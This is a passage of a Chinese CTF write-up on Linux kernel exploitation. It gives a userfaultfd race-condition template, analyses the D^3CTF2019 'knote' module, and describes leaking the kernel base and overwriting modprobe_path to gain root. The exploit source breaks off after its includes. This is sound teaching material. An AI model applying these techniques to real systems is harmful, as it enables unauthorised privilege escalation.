href="https://i.loli.net/2021/09/08/7iQO1b64XNaTkG8.png"><img src="https://s2.loli.net/2023/02/06/vqNE8LfA1swbMgU.png" alt="img"></a></p><h3 id="新版本内核对抗-userfaultfd-在-race-condition-中的利用"><a href="#新版本内核对抗-userfaultfd-在-race-condition-中的利用" class="headerlink" title="新版本内核对抗 userfaultfd 在 race condition 中的利用"></a>新版本内核对抗 userfaultfd 在 race condition 中的利用</h3><p>正所谓“没有万能的银弹”，可能有的人会发现在较新版本的内核中 userfaultfd 系统调用无法成功启动：</p><p><a href="https://i.loli.net/2021/09/08/e2LRJKzQVYSTO5k.png"><img src="https://s2.loli.net/2023/02/06/N8yozIhODSZ4A3V.png" alt="image.png"></a></p><p>这是因为在较新版本的内核中修改了变量 <code>sysctl_unprivileged_userfaultfd</code> 的值：</p><blockquote><p>来自 linux-5.11 源码<code>fs/userfaultfd.c</code>：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">int</span> sysctl_unprivileged_userfaultfd __read_mostly;<br><span class="hljs-comment">//...</span><br>SYSCALL_DEFINE1(userfaultfd, <span class="hljs-keyword">int</span>, flags)<br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">userfaultfd_ctx</span> *<span class="hljs-title">ctx</span>;</span><br>    <span class="hljs-keyword">int</span> fd;<br><br>    <span class="hljs-keyword">if</span> (!sysctl_unprivileged_userfaultfd &amp;&amp;<br>        (flags &amp; UFFD_USER_MODE_ONLY) == <span class="hljs-number">0</span> &amp;&amp;<br>        !capable(CAP_SYS_PTRACE)) &#123;<br>        printk_once(KERN_WARNING <span class="hljs-string">&quot;uffd: Set unprivileged_userfaultfd &quot;</span><br>            <span class="hljs-string">&quot;sysctl knob to 1 if kernel faults must be handled &quot;</span><br>            <span class="hljs-string">&quot;without obtaining CAP_SYS_PTRACE capability\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> -EPERM;<br>    &#125;<br><span class="hljs-comment">//...</span><br></code></pre></div></td></tr></table></figure><blockquote><p>来自 linux-5.4 源码<code>fs/userfaultfd.c</code>：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">int</span> sysctl_unprivileged_userfaultfd __read_mostly = <span class="hljs-number">1</span>;<br><span class="hljs-comment">//...</span><br></code></pre></div></td></tr></table></figure><p>在之前的版本当中 <code>sysctl_unprivileged_userfaultfd</code> 这一变量被初始化为 <code>1</code>，而在较新版本的内核当中这一变量并没有被赋予初始值，<strong>编译器会将其放在 bss 段，默认值为 0</strong></p><p>这意味着在较新版本内核中<strong>只有 root 权限才能使用 userfaultfd</strong>，这或许意味着刚刚进入大众视野的 userfaultfd 可能又将逐渐淡出大众视野（<del>微博@来去之间</del>），但不可否认的是，userfaultfd 确乎为我们在 Linux kernel 中的条件竞争利用提供了一个全新的思路与一种极其稳定的利用手法</p><h3 id="CTF-中的-userfaultfd-板子"><a href="#CTF-中的-userfaultfd-板子" class="headerlink" title="CTF 中的 userfaultfd 板子"></a>CTF 中的 userfaultfd 板子</h3><p>userfaultfd 的整个操作流程比较繁琐，故笔者现给出如下板子：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">static</span> <span class="hljs-keyword">pthread_t</span> monitor_thread;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">errExit</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Error at: %s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">registerUserFaultFd</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * addr, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> len, <span class="hljs-keyword">void</span> (*handler)(<span class="hljs-keyword">void</span>*))</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">long</span> uffd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>    <span class="hljs-keyword">int</span> s;<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    uffdio_register.range.start = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    s = pthread_create(&amp;monitor_thread, <span class="hljs-literal">NULL</span>, handler, (<span class="hljs-keyword">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在使用时直接调用即可：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C">registerUserFaultFd(addr, len, handler);<br></code></pre></div></td></tr></table></figure><p>需要注意的是 handler 的写法，这里直接照抄 Linux man page 改了改，可以根据个人需求进行个性化改动：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> *page = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 你要拷贝进去的数据</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> page_size;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-keyword">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-keyword">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-keyword">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * [在这停顿.jpg]</span><br><span class="hljs-comment">         * 当 poll 返回时说明出现了缺页异常</span><br><span class="hljs-comment">         * 你可以在这里插入一些比如说 sleep() 一类的操作</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="例题：D-3CTF2019-knote"><a href="#例题：D-3CTF2019-knote" class="headerlink" title="例题：D^3CTF2019 - knote"></a>例题：D^3CTF2019 - knote</h3><blockquote><p><a href="https://arttnba3.cn/download/d3ctf2019/knote.7z">点击下载-knote.7z</a></p></blockquote><h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><p>首先查看启动脚本</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs BASH"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">cd</span> /home/ctf<br>qemu-system-x86_64 \<br>-m 128M \<br>-kernel ./bzImage \<br>-initrd  ./rootfs.cpio \<br>-append <span class="hljs-string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \<br>-nographic \<br>-monitor /dev/null \<br>-smp cores=2,threads=1 \<br>-cpu qemu64,+smep,+smap<br></code></pre></div></td></tr></table></figure><p>开启了 smap、smep、kaslr 保护</p><p>将 <code>note.ko</code> 拖入 IDA 进行分析：</p><p>只定义了 ioctl，在 ioctl 中定义了常规的菜单堆，限制了<strong>只能调用 ioctl 9 次</strong>，不过会在关闭的时候重置</p><p><a href="https://i.loli.net/2021/09/10/92QLxShmiUT8Xu6.png"><img src="https://s2.loli.net/2023/02/06/OjZKlPBMrh8dXsD.png" alt="image.png"></a></p><p><a href="https://i.loli.net/2021/09/23/t1nAMvBskzq3gLF.png"><img src="https://s2.loli.net/2023/02/06/vgWVpyxtbz6ukZC.png" alt="image.png"></a></p><p>简要分析可知我们应当传入如下数据结构：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>        <span class="hljs-keyword">size_t</span> size;<br>        <span class="hljs-keyword">size_t</span> index;<br>    &#125;;<br>    <span class="hljs-keyword">char</span> * buf;<br>&#125; Chunk;<br></code></pre></div></td></tr></table></figure><p>add 占用写锁，限制 size 在 0x1000 以下，不过对于常用结构体而言够用了；这里的全局数组 buf 同为 chunk 类型</p><p><a href="https://i.loli.net/2021/09/23/VTH4u1l7LCGgYUb.png"><img src="https://s2.loli.net/2023/02/06/jUn6qyN1GIWVgf4.png" alt="image.png"></a></p><p>edit 没加锁，用 copy_user_generic_unrolled 从用户空间拷贝数据（其实就是 copy_from_user 的核心被编译器优化提取出来了）</p><p><a href="https://i.loli.net/2021/09/23/rTWXMhsSn1ANxim.png"><img src="https://s2.loli.net/2023/02/06/raBDuczY4XPJ9Om.png" alt="image.png"></a></p><p>get 向用户空间拷贝 chunk 内数据，也没加锁</p><p><a href="https://i.loli.net/2021/09/23/OqiejEnCNzIRAGD.png"><img src="https://s2.loli.net/2023/02/06/LkaX4CoMn1U5mFd.png" alt="image.png"></a></p><p>del 占了写锁</p><p><a href="https://i.loli.net/2021/09/23/xq7JTY2GlHIUebn.png"><img src="https://s2.loli.net/2023/02/06/H2r5OImKQoq69Ec.png" alt="image.png"></a></p><h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><p>在 Get() 当中使用了 user_copy_generic_unrolled 向用户空间拷贝数据，那么我们可以向内核传入一块被 userfaultfd 监视的 mmap 空间，在 userfaultfd 线程中先将拷贝暂停下来，随后在另一个线程当中<strong>将这个 object 释放掉后，重新分配到一些特殊的位置</strong>（例如 tty_struct），由此在拷贝线程重新启动后便能从该 object 中读出我们想要的数据</p><h5 id="泄露内核基址"><a href="#泄露内核基址" class="headerlink" title="泄露内核基址"></a>泄露内核基址</h5><p>笔者在这里选择将其分配到 tty_struct 上，从中 leak 数据，不过在这里在打开 <code>/dev/ptmx</code> 后似乎没法直接分配到 tty_struct （tty 魔数 0x5401 not match），而是分配到了一个奇怪的地方，不过我们仍能从中获取到内核相关函数地址从而泄露出内核基址</p><p><a href="https://i.loli.net/2021/09/23/51MfNIQCoyE86Sv.png"><img src="https://s2.loli.net/2023/02/06/JYTxbSX7dmikoPc.png" alt="image.png"></a></p><p>相应地，在本题中并未开启 hardened freelist，故我们可以很方便地直接通过条件竞争劫持 freelist 从而构造内核任意地址写，而现在我们已经拿到了内核基址，该考虑往哪写、写什么了</p><h5 id="modprobe-path-以-root-执行程序"><a href="#modprobe-path-以-root-执行程序" class="headerlink" title="modprobe_path 以 root 执行程序"></a>modprobe_path 以 root 执行程序</h5><p>当我们尝试去执行（execve）一个非法的文件（file magic not found），内核会经历如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C">entry_SYSCALL_64()<br>    sys_execve()<br>        do_execve()<br>            do_execveat_common()<br>                bprm_execve()<br>                    exec_binprm()<br>                        search_binary_handler()<br>                            __request_module() <span class="hljs-comment">// wrapped as request_module</span><br>                                call_modprobe()<br></code></pre></div></td></tr></table></figure><p>其中 <code>call_modprobe()</code> 定义于 <code>kernel/kmod.c</code>，我们主要关注这部分代码（以下来着内核源码5.14）：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">call_modprobe</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *module_name, <span class="hljs-keyword">int</span> wait)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    argv[<span class="hljs-number">0</span>] = modprobe_path;<br>    argv[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-q&quot;</span>;<br>    argv[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;--&quot;</span>;<br>    argv[<span class="hljs-number">3</span>] = module_name;    <span class="hljs-comment">/* check free_modprobe_argv() */</span><br>    argv[<span class="hljs-number">4</span>] = <span class="hljs-literal">NULL</span>;<br><br>    info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,<br>                     <span class="hljs-literal">NULL</span>, free_modprobe_argv, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">if</span> (!info)<br>        <span class="hljs-keyword">goto</span> free_module_name;<br><br>    <span class="hljs-keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);<br>    <span class="hljs-comment">//...</span><br></code></pre></div></td></tr></table></figure><p>在这里调用了函数 <code>call_usermodehelper_exec()</code> 将 <code>modprobe_path</code> 作为可执行文件路径以 root 权限将其执行，这个地址上默认存储的值为<code>/sbin/modprobe</code></p><p>我们不难想到的是：若是我们能够劫持 modprobe_path，将其改写为我们指定的恶意脚本的路径，随后我们再执行一个非法文件，<strong>内核将会以 root 权限执行我们的恶意脚本</strong></p><p>那么我们的 exp 就很容易构造出来了：通过两次 userfaultfd 劫持内核执行流，第一次泄露出内核加载的基址，第二次则劫持 modprobe_path，随后执行一个非法文件即可获得 flag</p><p>由于 slub 的机制的缘故，我们并不一定能够保证能够一次便能分配到我们想要的 object，在这里笔者写了一个脚本来多次尝试执行我们的 exp，而内核基址只需要泄漏一次，故笔者在这里在成功之后便写入一个临时文件中，若没能一次通关则在下一次重新运行 exp 时便能直接从第二次 userfaultfd 开始</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs BASH"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span><br><span class="hljs-keyword">do</span><br>    ./exp<br><span class="hljs-keyword">done</span><br></code></pre></div></td></tr></table></figure><p>需要注意的是当我们劫持 modprobe_path 后 <strong>slub 中的 freelist 便不再合法</strong>，而当我们退出进程时会回收内存，此时便会检测到非法的 freelist 从而导致 oops，因此最后我们不要立马退出我们的exp，笔者这里选择起一个新的 shell</p><p>exp如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><span 